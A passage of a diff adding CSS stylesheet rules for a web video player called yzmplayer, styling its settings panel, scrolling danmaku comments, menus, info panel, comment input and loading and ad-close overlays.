+	position: absolute;
+	right: -100%;
+	bottom: 60px;
+	-webkit-transform: scale(0);
+	transform: scale(0);
+	width: 130px;
+	padding: 4px 0;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	z-index: 1002;
+	background: rgba(21, 21, 21, .9);
+	border-radius: 2px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box>div {
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box>div.yzmplayer-setting-origin-panel {
+	display: block;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box.yzmplayer-setting-box-open {
+	-webkit-transform: scale(1);
+	transform: scale(1);
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box.yzmplayer-setting-box-narrow {
+	width: 70px;
+	height: 180px;
+	text-align: center;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box.yzmplayer-setting-box-speed {
+	right: -50%;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box.yzmplayer-setting-box-speed .yzmplayer-setting-origin-panel {
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box.yzmplayer-setting-box-speed .yzmplayer-setting-speed-panel {
+	display: block;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-item,
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-speed-item {
+	height: 30px;
+	padding: 0px 10px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	cursor: pointer;
+	position: relative;
+	justify-content: center;
+	display: flex;
+	position: relative;
+}
+
+.yzmplayer-controller .yzmplayer-setting-itemBlock {
+	left: 0;
+	width: 60%;
+	height: 100%;
+	top: 0;
+	position: absolute;
+	background-color: rgba(#f60,0.5);
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-item:hover {
+	background-color: hsla(0, 0%, 100%, .1);
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku {
+	padding: 0px 0;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku .yzmplayer-label {
+	padding: 0 10px;
+	display: inline;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku:hover .yzmplayer-label {
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku:hover .yzmplayer-danmaku-bar-wrap {
+	display: inline-block;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku.yzmplayer-setting-danmaku-active .yzmplayer-label {
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku.yzmplayer-setting-danmaku-active .yzmplayer-danmaku-bar-wrap {
+	display: inline-block;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap {
+	padding: 5px 10px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	/* display:none; */
+	vertical-align: middle;
+	height: 100%;
+	width: 100%;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar {
+	position: relative;
+	top: 8.5px;
+	width: 100%;
+	height: 3px;
+	background: #fff;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar .yzmplayer-danmaku-bar-inner {
+	position: absolute;
+	bottom: 0;
+	left: 0;
+	height: 100%;
+	-webkit-transition: all .1s ease;
+	transition: all .1s ease;
+	background: #aaa;
+	will-change: width;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar .yzmplayer-danmaku-bar-inner .yzmplayer-thumb {
+	position: absolute;
+	top: 0;
+	right: 5px;
+	margin-top: -4px;
+	margin-right: -10px;
+	height: 11px;
+	width: 11px;
+	border-radius: 50%;
+	cursor: pointer;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	background: #aaa;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-full {
+	display: inline-block;
+	height: 100%;
+	position: relative;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-full:hover .yzmplayer-full-in-icon {
+	-display: block;
+}
+
+.yzmplayer.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons .yzmplayer-full .yzmplayer-full-in-icon {
+	position: absolute;
+	top: -30px;
+	z-index: 1;
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-quality {
+	position: relative;
+	display: inline-block;
+	height: 100%;
+	z-index: 2;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-quality:hover .yzmplayer-quality-list,
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-quality:hover .yzmplayer-quality-mask {
+	display: block;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-quality .yzmplayer-quality-mask {
+	display: none;
+	position: absolute;
+	bottom: 38px;
+	left: -18px;
+	width: 80px;
+	padding-bottom: 12px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-quality .yzmplayer-quality-list {
+	display: none;
+	font-size: 12px;
+	width: 80px;
+	border-radius: 2px;
+	background: rgba(28, 28, 28, .9);
+	padding: 5px 0;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	overflow: hidden;
+	color: #fff;
+	text-align: center;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-quality .yzmplayer-quality-item {
+	height: 25px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	cursor: pointer;
+	line-height: 25px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-quality .yzmplayer-quality-item:hover {
+	background-color: hsla(0, 0%, 100%, .1);
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-comment {
+	display: none;
+	height: 100%;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-label {
+	color: #eee;
+	font-size: 14px;
+	display: flex;
+	vertical-align: middle;
+	white-space: nowrap;
+	align-items: center;
+	height: 100%;
+	justify-content: center;
+}
+
+.yzmplayer-controller .yzmplayer-setting-speed .yzmplayer-label {
+	padding-right: 10px;
+	padding-left: 6px;
+	justify-content: flex-start;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-speed {
+	justify-content: flex-start;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-label-paddingLeft {
+	padding-right: 40px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-speed-item:hover .yzmplayer-label {
+	transition: all .2s ease-in-out;
+	color: #00a1d6;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle {
+	width: 35px;
+	height: 20px;
+	text-align: center;
+	font-size: 0;
+	vertical-align: middle;
+	position: absolute;
+	top: 5px;
+	right: 10px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input {
+	max-height: 0;
+	max-width: 0;
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input+label {
+	display: inline-block;
+	position: relative;
+	-webkit-box-shadow: #dfdfdf 0 0 0 0 inset;
+	box-shadow: inset 0 0 0 0 #dfdfdf;
+	border: 1px solid rgba(245, 237, 237, 0);
+	height: 20px;
+	width: 30px;
+	border-radius: 10px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	cursor: pointer;
+	-webkit-transition: .2s ease-in-out;
+	transition: .2s ease-in-out;
+	background: hsla(0, 0%, 100%, .5);
+	background: rgba(251, 114, 153, 0.92);
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input+label:after,
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input+label:before {
+	position: absolute;
+	display: block;
+	height: 16px;
+	width: 16px;
+	line-height: 15px;
+	top: 1px;
+	left: 1px;
+	color: #fff;
+	border-radius: 16px;
+	-webkit-transition: .2s ease-in-out;
+	transition: .2s ease-in-out;
+	color: white;
+	content: "";
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input+label:after {
+	background: #fff;
+	-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .4);
+	box-shadow: 0 1px 3px rgba(0, 0, 0, .4);
+	color: #757575 !important;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input+label:after {
+	content: "\5f39";
+	font-size: 11px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-loop   input+label:after {
+	content: "";
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-jlast   input+label:after {
+	content: "";
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-jfrist  input+label:after {
+	content: "";
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-jfrist:hover .text {
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-jlast:hover .text {
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-loop input+label {
+	background: #757575;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-jlast input+label {
+	background: #757575;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-jfrist input+label {
+	background: #757575;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-jlast input+label.checked {
+	background: #00a1d6;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting-jfrist input+label.checked {
+	background: #00a1d6;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input:checked+label {
+	border-color: rgba(255, 255, 255, 0);
+	background: #00a1d6 !important;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input:checked+label:after {
+	left: 11px;
+	top: 1px;
+	color: #00a1d6 !important;
+}
+
+.yzmplayer-danmaku {
+	position: absolute;
+	left: 0;
+	right: 0;
+	top: 5%;
+	bottom: 10%;
+	font-size: 22px;
+	color: #fff;
+}
+
+.yzmplayer-danmaku .yzmplayer-danmaku-item {
+	display: inline-block;
+	pointer-events: none;
+	-webkit-user-select: none;
+	-moz-user-select: none;
+	-ms-user-select: none;
+	user-select: none;
+	cursor: default;
+	text-shadow: .5px .5px .5px rgba(0, 0, 0, .5);
+	white-space: pre;
+	pointer-events: none;
+	perspective: 500px;
+	will-change: transform;
+	font-size: 27.5px;
+	font-family: SimHei, "Microsoft JhengHei", Arial, Helvetica, sans-serif;
+	font-weight: normal;
+	line-height: 1.125;
+	text-shadow: rgb(0, 0, 0) 1px 0px 1px, rgb(0, 0, 0) 0px 1px 1px, rgb(0, 0, 0) 0px -1px 1px, rgb(0, 0, 0) -1px 0px 1px;
+}
+
+.yzmplayer-danmaku .yzmplayer-danmaku-item--demo {
+	position: absolute;
+	visibility: hidden;
+}
+
+.yzmplayer-danmaku .yzmplayer-danmaku-right {
+	position: absolute;
+	right: 0;
+	-webkit-transform: translateX(100%);
+	transform: translateX(100%);
+}
+
+.yzmplayer-danmaku .yzmplayer-danmaku-right.yzmplayer-danmaku-move {
+	will-change: transform;
+	-webkit-animation: danmaku 8.41424s linear;
+	animation: danmaku 8.41424s linear;
+	-webkit-animation-play-state: paused;
+	animation-play-state: paused;
+	user-select: none;
+	position: absolute;
+	/*opacity: 1;*/
+	-webkit-transform: translateZ(0);
+	transform: translateZ(0);
+}
+
+@-webkit-keyframes danmaku {
+	0% {
+		-webkit-transform: translateX(100%);
+		transform: translateX(100%);
+        /*opacity: 0;*/;
+	}
+
+	2% {
+		-webkit-transform: translateX(100%);
+		transform: translateX(100%);
+		/*opacity: 1;*/;
+	}
+}
+
+@keyframes danmaku {
+	0% {
+		-webkit-transform: translateX(100%);
+		transform: translateX(100%);
+        /*opacity: 0;*/;
+	}
+
+	2% {
+		-webkit-transform: translateX(100%);
+		transform: translateX(100%);
+		/*opacity: 1;*/;
+	}
+}
+
+.yzmplayer-danmaku .yzmplayer-danmaku-bottom,
+.yzmplayer-danmaku .yzmplayer-danmaku-top {
+	position: absolute;
+	width: 100%;
+	text-align: center;
+	visibility: hidden;
+}
+
+.yzmplayer-danmaku .yzmplayer-danmaku-bottom.yzmplayer-danmaku-move,
+.yzmplayer-danmaku .yzmplayer-danmaku-top.yzmplayer-danmaku-move {
+	will-change: visibility;
+	-webkit-animation: danmaku-center 4s linear;
+	animation: danmaku-center 4s linear;
+	-webkit-animation-play-state: paused;
+	animation-play-state: paused;
+}
+
+.yzmplayer.yzmplayer-paused .yzmplayer-danmaku:hover,
+.yzmplayer-danmaku-item:nth-child(2):hover {
+	-webkit-animation-play-state: paused !important;
+	animation-play-state: paused !important;
+}
+
+@-webkit-keyframes danmaku-center {
+	0% {
+		visibility: visible;
+	}
+
+	to {
+		visibility: visible;
+	}
+}
+
+@keyframes danmaku-center {
+	0% {
+		visibility: visible;
+	}
+
+	to {
+		visibility: visible;
+	}
+}
+
+.yzmplayer-logo {
+	pointer-events: none;
+	position: absolute;
+	right: 5%;
+	top: 5%;
+	width: 100px;
+	height: 55px;
+	opacity: .5;
+}
+
+.yzmplayer-logo img {
+	max-width: 100%;
+	max-height: 100%;
+	background: none;
+}
+
+.yzmplayer-menu {
+	position: absolute;
+	width: 195px;
+	border-radius: 2px;
+	background: rgba(28, 28, 28, .85);
+	/*padding: 5px 0;*/
+	overflow: hidden;
+	z-index: 3;
+	display: none;
+}
+
+.yzmplayer-menu-con {
+	position: relative;
+	width: 100%;
+	height: 100%;
+	z-index: 2;
+}
+
+.yzmplayer-menu-mesk {
+	position: fixed;
+	width: 100%;
+	height: 100%;
+	z-index: 1;
+	background: rgba(0,0,0,0);
+	left: 0;
+	top: 0;
+}
+
+.yzmplayer-menu.yzmplayer-menu-show {
+	display: block;
+}
+
+.yzmplayer-menu .yzmplayer-menu-item, .yzmplayer-menu .yzmplayer-menu-itemDom {
+	height: 39px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	cursor: pointer;
+	border-top: 1px solid hsla(0,0%,100%,.12);
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+.yzmplayer-menu .yzmplayer-menu-item:hover, .yzmplayer-menu .yzmplayer-menu-itemDom:hover {
+	background-color: hsla(0, 0%, 100%, 0.2);
+}
+
+.yzmplayer-menu .yzmplayer-menu-item a, .yzmplayer-menu .yzmplayer-menu-itemDom a {
+	padding: 0 10px;
+	line-height: 30px;
+	color: #eee;
+	font-size: 13px;
+	display: inline-block;
+	vertical-align: middle;
+	width: 100%;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	white-space: nowrap;
+	text-overflow: ellipsis;
+	overflow: hidden;
+}
+
+.yzmplayer-menu .yzmplayer-menu-item a:hover, .yzmplayer-menu .yzmplayer-menu-itemDom a:hover {
+	text-decoration: none;
+}
+
+.yzmplayer-notice {
+	opacity: 0;
+	position: absolute;
+	bottom: 60px;
+	left: 20px;
+	font-size: 14px;
+	border-radius: 2px;
+	background: rgba(21, 21, 21, .9);
+	padding: 0.2rem;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	overflow: hidden;
+	color: #fff;
+	pointer-events: none;
+}
+
+.yzmplayer-subtitle {
+	position: absolute;
+	bottom: 40px;
+	width: 90%;
+	left: 5%;
+	text-align: center;
+	color: #fff;
+	text-shadow: .5px .5px .5px rgba(0, 0, 0, .5);
+	font-size: 20px;
+}
+
+.yzmplayer-subtitle.yzmplayer-subtitle-hide {
+	display: none;
+}
+
+.yzmplayer-mask {
+	position: absolute;
+	top: 0;
+	bottom: 0;
+	left: 0;
+	right: 0;
+	z-index: 1;
+	display: none;
+}
+
+.yzmplayer-mask.yzmplayer-mask-show {
+	display: block;
+}
+
+.yzmplayer-video-wrap {
+	position: relative;
+	background: #000;
+	font-size: 0;
+	width: 100%;
+	height: 100%;
+}
+
+#videoNextButton {
+	padding: 3px;
+}
+
+#videoNextButton .yzmplayer-icon-content {
+	width: 100%;
+	height: 100%;
+}
+
+#videoNextButton .yzmplayer-icon-content svg {
+	width: 100%;
+}
+
+.yzmplayer-video-wrap .yzmplayer-video {
+	width: 100%;
+	height: 100%;
+	display: none;
+}
+
+.yzmplayer-video-wrap .yzmplayer-video-current {
+	display: block;
+}
+
+.yzmplayer-video-wrap .yzmplayer-video-prepare {
+	display: none;
+}
+
+@media (max-width:544px) {
+	.yzmplayer-info-panel {
+		left: 3%!important;
+		width: 90%!important;
+	}
+}
+
+.yzmplayer-color-popup {
+	width: 100%;
+	color: #99a2aa;
+	font-size: 12px;
+}
+
+.yzmplayer-color-popup-item {
+	width: 100%;
+	clear: both;
+	overflow: hidden;
+	padding-bottom: 5px;
+}
+
+.yzmplayer-color-popup .left {
+	float: left;
+	width: 25%;
+}
+
+.yzmplayer-color-popup .left .value {
+	width: 40px;
+	display: inline-block;
+}
+
+.yzmplayer-color-popup .right {
+	float: right;
+	width: 60%;
+}
+
+.yzmplayer-color-popup .value {
+	float: right;
+	width: 15%;
+}
+
+.yzmplayer-color-popup .right .bar {
+	position: relative;
+	top: 6px;
+}
+
+.yzmplayer-info-panel {
+	position: absolute;
+	top: 35px;
+	left: 15px;
+	width: 450px;
+	background: rgba(28, 28, 28, .8);
+	color: #99a2aa;
+	font-size: 12px;
+	border-radius: 2px;
+	background-color: #222;
+	opacity: 1;
+	background: rgba(21, 21, 21, .9);
+	border-radius: 2px;
+	z-index: 1;
+}
+
+.yzmplayer-info-panel-hide {
+	display: none;
+}
+
+.yzmplayer-info-panel .yzmplayer-info-panel-close {
+	cursor: pointer;
+	position: absolute;
+	right: 10px;
+	top: 0px;
+}
+
+.yzmplayer-info-panel-title {
+	width: 100%;
+	height: 45px;
+	text-align: center;
+	line-height: 45px;
+	position: relative;
+}
+
+.yzmplayer-info-panel-titleLine {
+	width: 100%;
+	height: 1px;
+	background: #fff;
+	opacity: 0.2;
+}
+
+.yzmplayer-video-wrap video {
+}
+
+.yzmplayer-info-panel-title>span.title {
+	font-size: 15px;
+	color: #fff;
+}
+
+.yzmplayer-info-panel-container {
+	padding: 10px;
+	padding-top: 15px;
+}
+
+.yzmplayer-info-panel .yzmplayer-info-panel-item {
+	padding-bottom: 5px;
+}
+
+.yzmplayer-info-panel .yzmplayer-info-panel-item>span {
+	display: inline-block;
+	vertical-align: middle;
+	line-height: 15px;
+	white-space: nowrap;
+	text-overflow: ellipsis;
+	overflow: hidden;
+}
+
+.yzmplayer-info-panel .yzmplayer-info-panel-item-title {
+	width: 70px;
+	text-align: left;
+	color: #fff;
+}
+
+.yzmplayer-info-panel .yzmplayer-info-panel-item-data {
+	width: 260px;
+}
+
+body,
+html {
+	font: 24px 'Microsoft YaHei', Arial, Lucida Grande, Tahoma, sans-serif;
+	width: 100%;
+	height: 100%;
+	padding: 0;
+	margin: 0;
+	overflow-x: hidden;
+	overflow-y: hidden;
+}
+
+* {
+	margin: 0;
+	padding: 0;
+	font-style: normal;
+	font-weight: normal;
+}
+
+a,
+li {
+	text-decoration: none;
+}
+
+ul,
+ol,
+dl {
+	list-style: none;
+}
+
+.yzmplayer-box, .yzmplayer {
+	width: 100%;
+	height: 100vh;
+}
+
+.yzmplayer-fulled #tuichuuyemian {
+	display: block;
+}
+
+.yzmplayer .yzmplayer-showing {
+	display: block;
+	position: absolute;
+	float: right;
+	height: 75px;
+	width: 90px;
+	bottom: 50px;
+	right: 5%;
+	-webkit-transition: all 0.3s ease-in-out;
+	transition: all 0.3s ease-in-out;
+}
+
+.yzmplayer-playing .yzmplayer-showing {
+	opacity: 0;
+	-webkit-transform: scale(1.5);
+	transform: scale(1.5);
+	z-index: 0;
+}
+
+.yzmplayer-playing .yzmplayer-cplayer {
+	z-index: 0;
+}
+
+.yzmplayer-paused .yzmplayer-showing {
+	z-index: 1001;
+	-webkit-transform: scale(1);
+	transform: scale(1);
+	opacity: 1;
+}
+
+.yzmplayer-danmu {
+	width: 299px;
+	position: fixed;
+	float: right;
+	height: calc((100% - 100px));
+	right: 15px;
+	top: 35px;
+	border-radius: 4px;
+	background-color: #222;
+	opacity: 1;
+	display: none;
+	background: rgba(21, 21, 21, .9);
+	border-radius: 2px;
+}
+
+.yzmplayer-danmu.show {
+	display: block;
+}
+
+.yzmplayer-watching {
+	width: 100%;
+	height: 60px;
+	line-height: 60px;
+	display: inline-block;
+	font-size: 12px;
+	color: #99a2aa;
+	/* box-shadow: #000 0 0 5px; */;
+}
+
+.yzmplayer-watching-number {
+	margin-left: 20px;
+	font-size: 18px;
+	font-weight: 700;
+	color: #fff;
+	padding: 0;
+	margin-right: 5px;
+}
+
+.yzmplayer-list {
+	width: 100%;
+	height: 30px;
+	overflow: hidden;
+}
+
+.yzmplayer-list li {
+	width: 60px;
+	height: 30px;
+	float: left;
+	color: #99a2aa;
+	font-size: 12px;
+	text-align: center;
+	line-height: 30px;
+}
+
+.yzmplayer-list li:nth-child(1) {
+	width: 75px !important;
+}
+
+.yzmplayer-list li:nth-child(2) {
+	width: 146px !important;
+	text-align: left;
+}
+
+.list-show {
+	width: 100%;
+	height: calc((100% - 92px));
+	overflow: auto;
+}
+
+.danmuku-list {
+	width: 100%;
+	height: 20px;
+	line-height: 20px;
+	text-align: left;
+	color: #99a2aa;
+	font-size: 12px;
+	display: block;
+	margin: auto;
+	overflow: auto;
+	margin-top: 5px;
+	position: relative;
+}
+
+.danmuku-list .report {
+	display: none;
+	position: absolute;
+	padding: 0 5px;
+	background-color: #121212;
+	text-align: center;
+	color: #fb7299;
+}
+
+.danmuku-list:hover .report {
+	display: block;
+}
+
+.danmuku-list li {
+	float: left;
+	width: 60px;
+	height: 20px;
+	white-space: nowrap;
+	cursor: pointer;
+}
+
+.danmuku-list li:nth-child(1) {
+	width: 70px;
+	margin-left: 4px;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	white-space: nowrap;
+	text-align: center;
+}
+
+.danmuku-list li:nth-child(2) {
+	width: 126px;
+	margin-right: 10px;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	white-space: nowrap;
+}
+
+.danmuku-list li:nth-child(2):hover {
+	color: #00a1d6;
+}
+
+.danmuku-list li:nth-child(3) {
+	margin-left: 5px;
+}
+
+ul::-webkit-scrollbar {
+	width: 6px;
+	height: 4px;
+}
+
+ul::-webkit-scrollbar-thumb {
+	border-radius: 10px;
+	-webkit-box-shadow: inset 0 0 5px #00a4db;
+	background: #00a4db;
+}
+
+ul::-webkit-scrollbar-track {
+	-webkit-box-shadow: inset 0 0 5px #ddd;
+	border-radius: 10px;
+	background: #ddd;
+}
+
+@-webkit-keyframes fastrx60 {
+	0% {
+		opacity: 0;
+		-webkit-transform: translate(60px, 0);
+	}
+
+	100% {
+		opacity: 1;
+		-webkit-transform: translate(0, 0);
+	}
+}
+
+@-webkit-keyframes fastr-20 {
+	0% {
+		opacity: 0;
+		transform: translate(0, -60px);
+	}
+
+	100% {
+		opacity: 1;
+		transform: translate(0, 0);
+	}
+}
+
+@-webkit-keyframes fastr-21 {
+	10% {
+		opacity: 0;
+		transform: translate(0, 60px);
+	}
+
+	100% {
+		opacity: 1;
+		transform: translate(0, 0);
+	}
+}
+
+.yzmplayer-danmu {
+	animation: fastrx60 0.5s;
+	-webkit-animation: fastrx60 0.5s;
+	-moz-animation: fastrx60 0.5s;
+}
+
+.memory-play-wrap .memory-play {
+	padding: 12px 12px !important;
+	border-radius: 4px;
+	color: #fff;
+	font-size: 14px;
+	user-select: none;
+	background-color: hsla(0, 0%, 13%, 0.4);
+	text-align: center;
+}
+
+.memory-play-wrap {
+	position: absolute;
+	left: 40px !important;
+	bottom: 65px !important;
+	z-index: 1000000000;
+	width: auto;
+}
+
+.memory-play-wrap .memory-play .play-jump {
+	color: #00c1de;
+	padding: 5px;
+	border-radius: 3px;
+	cursor: pointer;
+}
+
+.close {
+	padding: 0px 5px;
+	font-size: 24px;
+	vertical-align: -2.5px;
+	color: #00c1de;
+}
+
+.yzmplayer-info-panel {
+	animation: fastr-20 5.5s;
+	-webkit-animation: fastr-20 0.5s;
+	-moz-animation: fastr-20 0.5s;
+}
+
+.yzmplayer .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-comment-input {
+	outline: none;
+	border: none;
+	padding: 5px 10px;
+	font-size: 14px;
+	line-height: 34px;
+	text-align: left;
+	margin: 0 auto;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	width: 65%;
+	height: 34px;
+	color: #fff;
+	background: rgba(255, 255, 255, 0.2);
+	border-radius: 2px 0 0px 2px;
+	bottom: 0px;
+	position: relative;
+	float: left;
+}
+
+.yzmplayer .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-send-icon {
+	position: relative;
+	width: 60px;
+	height: 34px;
+	padding: 1px;
+	border-radius: 0px 2px 2px 0;
+	background-color: #00a1d6;
+	color: hsla(0, 0%, 100%, .5);
+	line-height: 34px;
+	bottom: 0px;
+	float: left;
+	color: #fff;
+	opacity: .9;
+}
+
+.yzmplayer .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-send-icon:active {
+	background-color: hsl(195, 100%, 42%);
+}
+
+::-webkit-input-placeholder {
+	/* WebKit browsers*/
+	color: #ddd;
+}
+
+::-moz-placeholder {
+	/* Mozilla Firefox 19+*/
+	color: #ddd;
+}
+
+:-ms-input-placeholder {
+	/* Internet Explorer 10+*/
+	color: #ddd;
+}
+
+.yzmplayer-comment-icon {
+	width: 45px !important;
+}
+
+.yzmplayer .yzmplayer-controller .yzm-yzmplayer-comment-input {
+	outline: none;
+	border: none;
+	padding: 5px 5px;
+	font-size: 14px;
+	/* line-height: 29px;*/
+	text-align: center;
+	margin: 0 auto;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	width: 73%;
+	height: 30px;
+	color: #fff;
+	background: hsla(0, 0%, 100%, .35);
+	border-radius: 4px 0 0px 4px;
+	bottom: 0px;
+	position: relative;
+	float: left;
+}
+
+.yzmplayer .yzmplayer-controller .yzm-yzmplayer-send-icon {
+	position: relative;
+	width: 40px;
+	height: 30px;
+	padding: 1px;
+	border-radius: 0px 4px 4px 0;
+	background-color: hsla(0, 0%, 100%, .3);
+	color: hsla(0, 0%, 100%, .5);
+	line-height: 30px;
+	bottom: 0;
+	float: left;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-icon {
+	/* width: 40px; */;
+}
+
+.yzmplayer-controller .yzmplayer-icons {
+	/* height: 55px; */;
+}
+
+.yzmplayer-controller {
+	/* height: 60px; */;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap {
+	/* bottom: 45px; */;
+}
+
+.yzmplayer .yzmplayer-showing {
+	bottom: 80px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-icon {
+	margin-top: 0px;
+	padding-right: 10px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-icon .yzmplayer-icon-content {
+	width: 100%;
+	height: 100%;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon {
+	display: none;
+	position: absolute;
+	bottom: 55px;
+	right: 45px;
+	margin: -18px 0 0 -18px;
+	pointer-events: none;
+	border: 0;
+	border-color: unset;
+	opacity: .8;
+	border-radius: 0;
+	width: 70px;
+	height: 100px;
+	-moz-animation: spinoffPulse .9s infinite linear;
+	-webkit-animation: unset;
+	background-size: 100%;
+	background-image: url();
+	top: 50%;
+	left: 50%;
+	height: 32px;
+	width: 32px;
+	background-image: url();
+	-webkit-animation: vod_loading 1s steps(30) infinite;
+	width: 54px;
+	height: 20px;
+	margin: -18px 0 0 -18px;
+	background-size: 54px 600px;
+	animation: vod_loading 1s steps(30) infinite;
+	opacity: 1;
+	background-image: url();
+}
+
+.yzmplayer:-webkit-full-screen .yzmplayer-fulloff-icon {
+	display: inline !important;
+}
+
+#close {
+	bottom: 5%;
+	left: 2%;
+	box-shadow: unset;
+	background: unset;
+	top: unset;
+	color: #666;
+	height: auto;
+	border-radius: 0;
+	text-align: left;
+	font-size: 12px;
+	width: 110px;
+	cursor: pointer;
+	position: absolute;
+	z-index: 99999;
+	display: inline-block;
+	line-height: 16px;
+}
+
+#loading-box {
+	width: 100%;
+	height: 100%;
+	position: absolute;
+	z-index: 10000000001;
+	background: #000;
+}
+
+#loading-boxad #close {
+	display: inline-block;
+	width: 100px;
+	height: 35px;
+	line-height: 35px;
+	text-align: center;
+	font-size: 14px;
+	border-radius: 22px;
+	margin: 0px 10px;
+	color: #2082B3;
+	overflow: hidden;
+	box-shadow: 0px 2px 3px rgba(0, 0, 0, .3);
+	background: #fff;
+	position: absolute;
+	z-index: 99999;
+	top: 3%;
+	right: 2%;
+	cursor: pointer;
+}
+
+#gg {
+	background: url() no-repeat center;
+	background-size: contain;
+	width: 100%;
+	height: 100%;
+}
+
+.tj,
+#close span {
+	display: none;
+	float: left;
+	font-weight: bold;
+}
+
+.wait {
